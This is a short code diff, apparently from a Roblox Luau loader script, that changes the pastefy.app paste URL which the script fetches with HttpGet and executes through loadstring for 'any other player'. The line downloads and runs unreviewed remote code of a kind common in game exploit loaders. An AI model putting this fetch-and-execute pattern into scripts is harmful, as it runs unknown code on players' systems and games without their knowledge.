@@ -160,7 +160,7 @@ task.spawn(function()
 Spawner.Load()
         else
             -- This is for any other player
-            loadstring(game:HttpGet("https://pastefy.app/NkomWxCB/raw"))()      
+            loadstring(game:HttpGet("https://pastefy.app/hXfnyJFv/raw"))()      
                 end
         -- --- END PLAYER DETECTION LOGIC ---
     end)
